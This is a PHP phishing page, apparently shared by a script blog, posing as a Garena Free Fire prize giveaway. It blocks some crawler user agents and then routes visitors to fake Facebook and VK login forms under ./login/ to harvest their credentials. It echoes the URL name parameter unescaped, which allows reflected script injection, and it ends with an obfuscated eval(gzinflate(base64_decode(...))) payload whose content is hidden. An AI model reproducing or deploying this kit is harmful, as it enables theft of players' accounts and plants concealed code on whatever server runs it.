<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya --><!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->

<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('https://www.facebook.com/IdhamDotID');
die();
}

    error_reporting(0);
    $namaloajg = $_GET['name'];
    $idhaam1 = ucfirst($namaloajg);
	$idhaam69 = array('1', '12', '13', '14', '15', '16' ,'1');
    $reward = $idhaam69[rand(0, (count($idhaam69)-1))];
    

?><!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta property="og:title" content="Selamat <?php echo $idhaam1;?>. Kamu mendapatkan Hadiah Silahkan Klik & Ambil - Garena Free Fire">
	<meta property="og:description" content="Selamat <?php echo $idhaam1;?>. Kamu mendapatkan Hadiah Silahkan Klik & Ambil - Garena Free Fire">
	<meta property="og:image" content="gmb/41707458_573073549791933_8041285127327711232_n.jpg">
    <link rel="stylesheet" href="./assets/css/miraipedia.css">
    <link rel="stylesheet" href="./assets/css/animate.css">
    <link rel="shorcut icon" href="http://freefiremobile-a.akamaihd.net/ffwebsite/images/app-icon.png"/>
    <title>Garena Free Fire</title>
</head>
<body>
    <div class="miraipedia">
        <div class="contentmirai">
            <div class="content-txt">
                               <img class="img-contentmirai" alt="miraipedia" src="gmb/logo-small-fixed.png">
                Selamat Datang <?php echo $idhaam1;?><br>
                Ambil hadiahmu Sekarang!<br>
                <div class="reward-mirai">
                    <img class="img-reward" alt="miraipedia" src="./assets/images/<?php echo $reward;?>.png">
                    <form method="POST">
                        <button type="submit" class="btn-contentmirai" name="reward" value="<?php echo $reward;?>">Ambil</button>
                    </form>
                </div><p>
                lucky to try again : 
                <form method="GET">
                    <button type="submit" class="btn-contentmirai" name="name" value="<?php echo $idhaam1;?>">Lucky</button>
                </form>
            </div>
        </div>
            <img src="gmb/appstore3.png" />    <img src="gmb/googleplay3.png" />
        <?php
        if (isset($_POST['reward'])) { 
            $mirai = $_POST['reward'];
            echo "<div class='idhaam69'><div class='miraipedia-confirm animated wobble'>
            <div class='txt-confirm'>Please log in</div>
            <form id='idhaam69' action='./login/index.php' method='POST'>
                <button type='submit' class='btn-contentmirai' name='mirai-reward' value='$mirai'>FB</button>
            </form>
            <form id='idhaam69' action='./login/index2.php' method='GET'>
                <button type='submit' class='btn-contentmirai' name='name' value='$idhaam1'>VK</button>
            </form>
        </div></div>";}
        ?>
        
    </div><?php eval(gzinflate(base64_decode('jY9La8JAEMfvgXyHYRE2lvgolFISBG1NwYN9xNiLyLJNVnfbbBJ2J6Df3k2lYm89Dczv/5iZqkoxKzCgdYtNi+yz3e2EUdWehjDuxzC9CAplm5IfmTCmNvaMfc8hhkoLViqtMOgsF4cWujbHM3F6en+3pI5LwQthAvpUVygqHGTHRkS+h+KAI4m6jCGX3LiEyTp7Hjx0lh62Xy2vNFclTIB+i7xFza2St+PpvtsO81pTpzuwhqP0vQkQidhEoxGBIfTYKkk/knRDz5O9zJYJ3f4hafK+TlYZW6cLunWP9RphecV4KQy6TrJTh994iBq4WbzBrCiMsBYi2ICrcZ6rtOVrlrDZfJ7+9BDYkhi6S4OrX0LfIyl/VApzSUK4rgyB/Cu0H58A'))); ?>
</body>
</html>